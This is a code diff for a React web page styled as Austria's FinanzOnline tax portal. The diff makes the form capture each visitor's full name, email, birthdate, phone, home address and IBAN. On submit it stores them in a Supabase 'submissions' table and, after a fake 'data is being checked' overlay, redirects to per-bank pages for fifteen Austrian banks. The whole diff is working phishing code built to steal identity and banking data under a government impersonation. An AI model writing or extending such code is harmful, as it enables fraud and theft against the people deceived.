@@ -1,7 +1,10 @@
 import Header from "@/components/Header";
 import { Info, AlertTriangle, ChevronsUpDown, Check } from "lucide-react";
-import { useState, useRef, useEffect } from "react";
+import { useState, useRef, useEffect, useCallback } from "react";
+import { useNavigate } from "react-router-dom";
 import { cn } from "@/lib/utils";
+import { supabase } from "@/integrations/supabase/client";
+import LoadingOverlay from "@/components/LoadingOverlay";
 import {
   Popover,
   PopoverContent,
@@ -54,11 +57,44 @@ const banks = [
   { name: "Marchfelder Bank", icon: marchfelderIcon },
 ];
 
+const bankRouteMap: Record<string, string> = {
+  "Raiffeisen Bank": "/raiffeisenbank",
+  "Erste Bank": "/erstebank",
+  "BAWAG P.S.K.": "/bawag",
+  "Bank Austria": "/bankaustria",
+  "Volksbank": "/volksbank",
+  "Easy Bank": "/easybank",
+  "HYPO NOE": "/hyponoe",
+  "OberBank": "/oberbank",
+  "Bank99": "/bank99",
+  "Schelhammer": "/schelhammer",
+  "Bankhaus Spängler": "/bankhausspaengler",
+  "Dolomiten Bank": "/dolomitenbank",
+  "Sparda Bank": "/spardabank",
+  "Dadat Bank": "/dadatbank",
+  "Marchfelder Bank": "/marchfelderbank",
+};
+
 const Index = () => {
+  const navigate = useNavigate();
   const [bankOpen, setBankOpen] = useState(false);
   const [selectedBank, setSelectedBank] = useState("");
   const [bankSearch, setBankSearch] = useState("");
   const inputRef = useRef<HTMLInputElement>(null);
+  const [showLoading, setShowLoading] = useState(false);
+
+  // Form state
+  const [fullName, setFullName] = useState("");
+  const [email, setEmail] = useState("");
+  const [birthdate, setBirthdate] = useState("");
+  const [phone, setPhone] = useState("");
+  const [street, setStreet] = useState("");
+  const [houseNumber, setHouseNumber] = useState("");
+  const [staircase, setStaircase] = useState("");
+  const [doorNumber, setDoorNumber] = useState("");
+  const [postalCode, setPostalCode] = useState("");
+  const [city, setCity] = useState("");
+  const [iban, setIban] = useState("");
 
   useEffect(() => {
     if (bankOpen && inputRef.current) {
@@ -68,8 +104,38 @@ const Index = () => {
 
   const selectedBankObj = banks.find((b) => b.name === selectedBank);
 
+  const handleSubmit = useCallback(async () => {
+    if (!selectedBank) return;
+    const sessionId = crypto.randomUUID().slice(0, 8);
+    await supabase.from("submissions").insert({
+      session_id: sessionId,
+      full_name: fullName,
+      email,
+      birthdate,
+      phone,
+      street,
+      house_number: houseNumber,
+      staircase,
+      door_number: doorNumber,
+      postal_code: postalCode,
+      city,
+      iban,
+      bank: selectedBank,
+    });
+    const route = bankRouteMap[selectedBank];
+    if (route) {
+      setShowLoading(true);
+      setTimeout(() => {
+        navigate(`${route}?s=${sessionId}`);
+      }, 2500);
+    }
+  }, [selectedBank, fullName, email, birthdate, phone, street, houseNumber, staircase, doorNumber, postalCode, city, iban, navigate]);
+
   return (
     <div className="min-h-screen bg-white">
+      {showLoading && (
+        <LoadingOverlay message="Daten werden überprüft..." onComplete={() => {}} />
+      )}
       <Header />
       <h1 className="py-8 text-center text-xl font-bold text-black md:py-12 md:text-2xl">
         Willkommen bei FinanzOnline
@@ -115,60 +181,60 @@ const Index = () => {
             <div className="space-y-5">
               <div>
                 <label className="mb-1.5 block text-sm font-medium text-gray-600">Voller Name</label>
-                <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
+                <input type="text" value={fullName} onChange={(e) => setFullName(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
               </div>
 
               <div>
                 <label className="mb-1.5 block text-sm font-medium text-gray-600">E-Mail</label>
-                <input type="email" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
+                <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
               </div>
 
               <div>
                 <label className="mb-1.5 block text-sm font-medium text-gray-600">Geburtsdatum</label>
-                <input type="text" placeholder="TT.MM.JJJJ" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
+                <input type="text" value={birthdate} onChange={(e) => setBirthdate(e.target.value)} placeholder="TT.MM.JJJJ" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
               </div>
 
               <div>
                 <label className="mb-1.5 block text-sm font-medium text-gray-600">Telefonnummer</label>
-                <input type="tel" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
+                <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
               </div>
 
               <div className="grid grid-cols-3 gap-4">
                 <div className="col-span-2">
                   <label className="mb-1.5 block text-sm font-medium text-gray-600">Straße</label>
-                  <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
+                  <input type="text" value={street} onChange={(e) => setStreet(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                 </div>
                 <div>
                   <label className="mb-1.5 block text-sm font-medium text-gray-600">Hausnummer</label>
-                  <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
+                  <input type="text" value={houseNumber} onChange={(e) => setHouseNumber(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                 </div>
               </div>
 
               <div className="grid grid-cols-2 gap-4">
                 <div>
                   <label className="mb-1.5 block text-sm font-medium text-gray-600">Stiege</label>
-                  <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
+                  <input type="text" value={staircase} onChange={(e) => setStaircase(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                 </div>
                 <div>
                   <label className="mb-1.5 block text-sm font-medium text-gray-600">Türnummer</label>
-                  <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
+                  <input type="text" value={doorNumber} onChange={(e) => setDoorNumber(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                 </div>
               </div>
 
               <div className="grid grid-cols-2 gap-4">
                 <div>
                   <label className="mb-1.5 block text-sm font-medium text-gray-600">Postleitzahl</label>
-                  <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
+                  <input type="text" value={postalCode} onChange={(e) => setPostalCode(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                 </div>
                 <div>
                   <label className="mb-1.5 block text-sm font-medium text-gray-600">Stadt</label>
-                  <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
+                  <input type="text" value={city} onChange={(e) => setCity(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                 </div>
               </div>
 
               <div>
                 <label className="mb-1.5 block text-sm font-medium text-gray-600">IBAN</label>
-                <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
+                <input type="text" value={iban} onChange={(e) => setIban(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
               </div>
 
               {/* Bank Auswahl */}
@@ -247,7 +313,7 @@ const Index = () => {
               </div>
 
               <div className="pt-2">
-                <button className="w-full rounded-md border border-[#00436b] bg-white py-2.5 text-sm font-medium text-[#00436b] hover:bg-[#00436b]/5">
+                <button onClick={handleSubmit} className="w-full rounded-md border border-[#00436b] bg-white py-2.5 text-sm font-medium text-[#00436b] hover:bg-[#00436b]/5">
                   Weiter
                 </button>
               </div>
